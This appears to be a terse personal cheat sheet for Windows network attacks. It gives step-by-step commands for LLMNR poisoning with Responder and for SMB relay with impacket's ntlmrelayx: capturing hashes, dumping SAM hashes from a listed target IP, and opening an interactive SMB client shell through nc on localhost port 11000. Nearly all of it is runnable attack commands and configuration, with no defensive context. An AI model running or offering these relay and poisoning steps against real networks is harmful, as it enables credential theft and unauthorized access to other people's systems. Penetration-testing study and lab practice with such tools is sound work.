# LLMNR Poisoning
```bash 
'start the responder tool'

responder -I tun0 -dwv

'got the hash <3'
```
# SMB Relay Attack
```bash 
'start the responder tool (turn off smb and http)'

nano /etc/responder/Responder.conf 

┌──(root💀kali)-[/var/www/html/login]
└─# cat /etc/responder/Responder.conf
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On

'then start the tool'

responder -I tun0 -dwv

'And save the target in a txt file eg:-'

echo "192.168.18.6" >> target.txt

then start

cd /tools/impacket/exaples

./ntlmrelayx.py -tf ~/target.txt -smb2support

'got the sam hash'

```
# SMB Relay Attack (SMB Client shell )
```bash 
'start the responder tool (turn off smb and http)'

nano /etc/responder/Responder.conf 

┌──(root💀kali)-[/var/www/html/login]
└─# cat /etc/responder/Responder.conf
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On

'then start the tool'

responder -I tun0 -dwv

'And save the target in a txt file eg:-'

echo "192.168.18.6" >> target.txt

then start

cd /tools/impacket/exaples

./ntlmrelayx.py -tf ~/target.txt -smb2support -i

nc localhost 11000

'got the smb client shell via local host 11000'
```
